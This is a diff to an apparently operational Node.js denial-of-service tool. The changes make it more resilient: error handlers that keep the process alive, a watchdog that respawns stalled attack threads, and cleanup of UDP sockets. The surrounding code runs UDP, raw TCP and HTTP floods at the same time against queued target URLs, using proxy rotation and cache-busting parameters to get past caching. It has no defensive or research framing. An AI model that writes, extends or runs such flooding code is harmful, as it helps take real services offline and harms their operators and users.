@@ -27,6 +27,21 @@ const USE_RAW_TCP = process.env.RAW_TCP !== "false";
 const KEEP_ALIVE = process.env.KEEP_ALIVE !== "false";
 const L7_BYPASS = process.env.L7_BYPASS !== "false";
 
+// ===================== PROCESS-LEVEL ERROR GUARDS =====================
+// Prevents the entire process from crashing on unhandled errors/rejections
+// which is the #1 cause of the attack stopping suddenly after hours of runtime.
+process.on('uncaughtException', (err) => {
+  try { console.error(colors.red(`[FATAL] Uncaught Exception: ${err.message}`)); } catch {}
+  // Keep process alive — do NOT exit
+});
+
+process.on('unhandledRejection', (reason) => {
+  // Suppress noisy abort/network errors that are already handled
+  if (!reason || reason.code === 'UND_ERR_ABORTED' || reason.code === 'ECONNRESET' || reason.code === 'ETIMEDOUT') return;
+  try { console.error(colors.red(`[FATAL] Unhandled Rejection: ${reason?.message || reason}`)); } catch {}
+  // Keep process alive — do NOT exit
+});
+
 const colors = {
   red: (t) => `\x1b[31m${t}\x1b[0m`,
   green: (t) => `\x1b[32m${t}\x1b[0m`,
@@ -163,21 +178,41 @@ function getJitter() {
 
 // ===================== ATTACK FUNCTIONS =====================
 
+// Track all UDP sockets so we can close them when the attack stops
+const udpSockets = new Set();
+
 function udpFlood(targetIP, port, threadId) {
   const socket = dgram.createSocket("udp4");
+  udpSockets.add(socket);
   const payload = Buffer.alloc(1400, "A");
   let sent = 0;
+  let closed = false;
+  const cleanup = () => {
+    if (!closed) { closed = true; udpSockets.delete(socket); clearInterval(closeTimer); try { socket.close(); } catch {} }
+  };
   const flood = () => {
-    if (!continueAttack) { socket.close(); return; }
+    if (!continueAttack) { cleanup(); return; }
     for (let i = 0; i < 10; i++) {
       socket.send(payload, 0, payload.length, port, targetIP, (err) => {
         if (!err) sent++;
       });
     }
-    setImmediate(flood);
+    if (continueAttack) setImmediate(flood);
   };
   setImmediate(flood);
+  // Also close socket if attack stops for 5+ seconds (safety net)
+  const closeTimer = setInterval(() => {
+    if (!continueAttack) { clearInterval(closeTimer); cleanup(); }
+  }, 5000);
   return () => sent;
+}
+
+// Close all UDP sockets (called when attack stops)
+function closeAllUdpSockets() {
+  for (const sock of udpSockets) {
+    try { sock.close(); } catch {}
+  }
+  udpSockets.clear();
 }
 
 function rawTCPFlood(host, port, threadId) {
@@ -268,52 +303,56 @@ if (USE_CLUSTER && cluster.isWorker) {
   let currentTarget = null;
 
   const performAttack = async (target, ctx, threadId, isDirect) => {
-    if (!continueAttack || !target) return;
-
-    const endTime = target.startTime + target.duration;
-    if (Date.now() > endTime) {
-      if (process.connected) process.send({ type: "targetComplete" });
-      return;
-    }
-
-    // Launch ALL attack types simultaneously
-    if (USE_UDP) {
-      const parsed = new URL(target.url);
-      udpFlood(parsed.hostname, parsed.port || 80, threadId);
-    }
-    if (USE_RAW_TCP) {
-      const parsed = new URL(target.url);
-      rawTCPFlood(parsed.hostname, parsed.port || 80, threadId);
-    }
-    // HTTP/L7 requests fire concurrently with UDP/TCP above
-    const promises = [];
-    for (let i = 0; i < REQUESTS_PER_CYCLE; i++) {
-      const cb = generateCacheBuster();
-      const sep = target.url.includes("?") ? "&" : "?";
-      const url = `${target.url}${sep}_=${cb}&nocache=${cb}&cb=${Date.now()}&r=${Math.random()}`;
-      if (ctx.type === "socks") {
-        promises.push(socksRequest(url, ctx.agent));
-      } else if (ctx.type === "http") {
-        promises.push(
-          urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: getNoCacheHeaders(), signal: AbortSignal.timeout(5000) })
-            .then(async (res) => { await res.body.dump(); return { status: res.statusCode }; })
-            .catch(() => null)
-        );
-      } else {
-        promises.push(fireHTTPRequest(url, ctx));
-      }
-    }
-
-    let successfulRequests = 0;
     try {
-      const results = await Promise.allSettled(promises);
-      for (const r of results) {
-        if (r.status === "fulfilled" && r.value && r.value.status) successfulRequests++;
-      }
-    } catch {}
+      if (!continueAttack || !target) return;
 
-    if (process.connected) {
-      process.send({ type: "report", count: successfulRequests, threadId });
+      const endTime = target.startTime + target.duration;
+      if (Date.now() > endTime) {
+        if (process.connected) process.send({ type: "targetComplete" });
+        return;
+      }
+
+      // Launch ALL attack types simultaneously
+      if (USE_UDP) {
+        const parsed = new URL(target.url);
+        udpFlood(parsed.hostname, parsed.port || 80, threadId);
+      }
+      if (USE_RAW_TCP) {
+        const parsed = new URL(target.url);
+        rawTCPFlood(parsed.hostname, parsed.port || 80, threadId);
+      }
+      // HTTP/L7 requests fire concurrently with UDP/TCP above
+      const promises = [];
+      for (let i = 0; i < REQUESTS_PER_CYCLE; i++) {
+        const cb = generateCacheBuster();
+        const sep = target.url.includes("?") ? "&" : "?";
+        const url = `${target.url}${sep}_=${cb}&nocache=${cb}&cb=${Date.now()}&r=${Math.random()}`;
+        if (ctx.type === "socks") {
+          promises.push(socksRequest(url, ctx.agent));
+        } else if (ctx.type === "http") {
+          promises.push(
+            urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: getNoCacheHeaders(), signal: AbortSignal.timeout(5000) })
+              .then(async (res) => { await res.body.dump(); return { status: res.statusCode }; })
+              .catch(() => null)
+          );
+        } else {
+          promises.push(fireHTTPRequest(url, ctx));
+        }
+      }
+
+      let successfulRequests = 0;
+      try {
+        const results = await Promise.allSettled(promises);
+        for (const r of results) {
+          if (r.status === "fulfilled" && r.value && r.value.status) successfulRequests++;
+        }
+      } catch {}
+
+      if (process.connected) {
+        process.send({ type: "report", count: successfulRequests, threadId });
+      }
+    } catch (err) {
+      try { console.error(colors.red(`[Worker Thread ${threadId}] Attack error: ${err.message}`)); } catch {}
     }
 
     if (continueAttack) {
@@ -347,6 +386,71 @@ if (USE_CLUSTER && cluster.isWorker) {
   setInterval(() => {}, 60000);
   module.exports = {};
   return;
+}
+
+// ===================== WATCHDOG =====================
+// Periodically checks if the attack should be running but threads appear dead.
+// Re-spawns attack threads if the process is still alive but no requests are flowing.
+
+let watchdogTimer = null;
+let lastWatchdogReqCount = 0;
+let watchdogStallCount = 0;
+
+function startWatchdog() {
+  stopWatchdog();
+  lastWatchdogReqCount = totalRequestsSent + totalReqCount;
+  watchdogStallCount = 0;
+  watchdogTimer = setInterval(() => {
+    const currentCount = totalRequestsSent + totalReqCount;
+    if (continueAttack && currentTarget && !(USE_CLUSTER && cluster.isMaster)) {
+      // Check if requests are still flowing
+      if (currentCount === lastWatchdogReqCount) {
+        watchdogStallCount++;
+        if (watchdogStallCount >= 5) { // 5 consecutive stalls = ~5 seconds of no activity
+          console.log(colors.yellow("[Watchdog] Attack appears stalled — respawning threads..."));
+          // Respawning: set flag and restart attack on the same target
+          const savedTarget = currentTarget;
+          continueAttack = true; // Ensure flag is set
+          activeThreads = [];
+          const proxies = loadProxies();
+          let threadId = 0;
+          const directCount = proxies.length ? Math.floor(numThreads / 2) : numThreads;
+          const proxyCount = proxies.length ? numThreads - directCount : 0;
+          if (!proxies.length) {
+            for (let i = 0; i < numThreads; i++) {
+              if (!continueAttack) break;
+              performAttackSingle(savedTarget, { type: "direct" }, threadId++, true);
+              activeThreads.push(i);
+            }
+          } else {
+            for (let i = 0; i < directCount; i++) {
+              if (!continueAttack) break;
+              performAttackSingle(savedTarget, { type: "direct" }, threadId++, true);
+              activeThreads.push(i);
+            }
+            for (let i = 0; i < proxyCount; i++) {
+              if (!continueAttack) break;
+              performAttackSingle(savedTarget, createContext(getRandomElement(proxies)), threadId++, false);
+              activeThreads.push(i + directCount);
+            }
+          }
+          console.log(colors.green(`[Watchdog] Respinned ${activeThreads.length} threads`));
+          watchdogStallCount = 0;
+        }
+      } else {
+        watchdogStallCount = 0;
+      }
+      lastWatchdogReqCount = currentCount;
+    }
+  }, 1000);
+}
+
+function stopWatchdog() {
+  if (watchdogTimer) {
+    clearInterval(watchdogTimer);
+    watchdogTimer = null;
+  }
+  watchdogStallCount = 0;
 }
 
 // ===================== MASTER / SINGLE-PROCESS =====================
@@ -546,6 +650,7 @@ const startAttack = async (url, durationHours) => {
       cluster.workers[id].send({ type: "start", target: currentTarget, threadsForMe: threadsPerWorker });
     }
     startStatusDisplay();
+    startWatchdog();
   } else {
     // Single-process mode: launch threads directly
     activeThreads = [];
@@ -568,84 +673,91 @@ const startAttack = async (url, durationHours) => {
         activeThreads.push(i + directCount);
       }
     }
+    startWatchdog();
   }
   return true;
 };
 
-// Single-process attack function (identical to original)
+// Single-process attack function — wrapped in try/catch so errors
+// in one cycle never kill the thread. The next cycle is always scheduled.
 const performAttackSingle = async (target, ctx, threadId, isDirect) => {
-  if (!continueAttack || !target) return;
-
-  const endTime = target.startTime + target.duration;
-  if (Date.now() > endTime) {
-    console.log(colors.yellow(`Target completed: ${target.url}`));
-    if (targetQueue.length > 0) {
-      currentTarget = targetQueue.shift();
-      console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
-      resetTotal();
-      state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
-      saveNow();
-    } else {
-      continueAttack = false;
-      currentTarget = null;
-      resetTotal();
-      state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
-      saveNow();
-      console.log(colors.yellow("All targets completed. Attack finished."));
-    }
-    return;
-  }
-
-  // Launch ALL attack types simultaneously
-  if (USE_UDP) {
-    const parsed = new URL(target.url);
-    udpFlood(parsed.hostname, parsed.port || 80, threadId);
-  }
-  if (USE_RAW_TCP) {
-    const parsed = new URL(target.url);
-    rawTCPFlood(parsed.hostname, parsed.port || 80, threadId);
-  }
-  // HTTP/L7 requests fire concurrently with UDP/TCP above
-  const startTime = Date.now();
-  const promises = [];
-  for (let i = 0; i < REQUESTS_PER_CYCLE; i++) {
-    const cb = generateCacheBuster();
-    const sep = target.url.includes("?") ? "&" : "?";
-    const url = `${target.url}${sep}_=${cb}&nocache=${cb}&cb=${Date.now()}&r=${Math.random()}`;
-    if (ctx.type === "socks") {
-      promises.push(socksRequest(url, ctx.agent));
-    } else if (ctx.type === "http") {
-      promises.push(
-        urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: getNoCacheHeaders(), signal: AbortSignal.timeout(2000) })
-          .then(async (res) => { await res.body.dump(); return { status: res.statusCode }; })
-          .catch(() => null)
-      );
-    } else {
-      promises.push(fireHTTPRequest(url, ctx));
-    }
-  }
-
-  let successfulRequests = 0;
   try {
-    const results = await Promise.allSettled(promises);
-    for (const r of results) {
-      if (r.status === "fulfilled" && r.value && r.value.status) successfulRequests++;
-    }
-  } catch {}
+    if (!continueAttack || !target) return;
 
-  totalRequestsSent += successfulRequests;
-  debouncedSave();
-
-  const duration = Date.now() - startTime;
-  if (threadId === 0 && duration > 0) {
-    const now = Date.now();
-    if (now - lastStatusLog > 1000) {
-      lastStatusLog = now;
-      const rps = (successfulRequests / (duration / 1000)).toFixed(1);
-      console.log(`${colors.green(">")} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(successfulRequests)} req`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.green(`RPS: ${rps}`)} | ${colors.magenta(`Threads: ${activeThreads.length}`)}`);
+    const endTime = target.startTime + target.duration;
+    if (Date.now() > endTime) {
+      console.log(colors.yellow(`Target completed: ${target.url}`));
+      if (targetQueue.length > 0) {
+        currentTarget = targetQueue.shift();
+        console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
+        resetTotal();
+        state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
+        saveNow();
+      } else {
+        continueAttack = false;
+        currentTarget = null;
+        resetTotal();
+        state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
+        saveNow();
+        console.log(colors.yellow("All targets completed. Attack finished."));
+      }
+      return;
     }
+
+    // Launch ALL attack types simultaneously
+    if (USE_UDP) {
+      const parsed = new URL(target.url);
+      udpFlood(parsed.hostname, parsed.port || 80, threadId);
+    }
+    if (USE_RAW_TCP) {
+      const parsed = new URL(target.url);
+      rawTCPFlood(parsed.hostname, parsed.port || 80, threadId);
+    }
+    // HTTP/L7 requests fire concurrently with UDP/TCP above
+    const startTime = Date.now();
+    const promises = [];
+    for (let i = 0; i < REQUESTS_PER_CYCLE; i++) {
+      const cb = generateCacheBuster();
+      const sep = target.url.includes("?") ? "&" : "?";
+      const url = `${target.url}${sep}_=${cb}&nocache=${cb}&cb=${Date.now()}&r=${Math.random()}`;
+      if (ctx.type === "socks") {
+        promises.push(socksRequest(url, ctx.agent));
+      } else if (ctx.type === "http") {
+        promises.push(
+          urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: getNoCacheHeaders(), signal: AbortSignal.timeout(2000) })
+            .then(async (res) => { await res.body.dump(); return { status: res.statusCode }; })
+            .catch(() => null)
+        );
+      } else {
+        promises.push(fireHTTPRequest(url, ctx));
+      }
+    }
+
+    let successfulRequests = 0;
+    try {
+      const results = await Promise.allSettled(promises);
+      for (const r of results) {
+        if (r.status === "fulfilled" && r.value && r.value.status) successfulRequests++;
+      }
+    } catch {}
+
+    totalRequestsSent += successfulRequests;
+    debouncedSave();
+
+    const duration = Date.now() - startTime;
+    if (threadId === 0 && duration > 0) {
+      const now = Date.now();
+      if (now - lastStatusLog > 1000) {
+        lastStatusLog = now;
+        const rps = (successfulRequests / (duration / 1000)).toFixed(1);
+        console.log(`${colors.green(">")} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(successfulRequests)} req`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.green(`RPS: ${rps}`)} | ${colors.magenta(`Threads: ${activeThreads.length}`)}`);
+      }
+    }
+  } catch (err) {
+    try { console.error(colors.red(`[Thread ${threadId}] Attack error: ${err.message}`)); } catch {}
   }
 
+  // Always schedule next cycle — errors in one cycle never kill the thread
   if (continueAttack) {
     const j = getJitter();
     if (j > 0) setTimeout(() => performAttackSingle(target, ctx, threadId, isDirect), j);
@@ -656,6 +768,8 @@ const performAttackSingle = async (target, ctx, threadId, isDirect) => {
 const stopAttack = async () => {
   if (!continueAttack) { console.log(colors.yellow("No active attack")); return; }
   continueAttack = false;
+  stopWatchdog();
+  closeAllUdpSockets();
   stopStatusDisplay();
   broadcastToWorkers({ type: "stop" });
   activeThreads = [];
@@ -709,6 +823,7 @@ const resumeAttack = async () => {
     }
     console.log(colors.green(`Resumed with ${activeThreads.length} threads (${halfThreads} direct + ${numThreads - halfThreads} proxy)`));
   }
+  startWatchdog();
 };
 
 const autoStartTunnel = async () => {
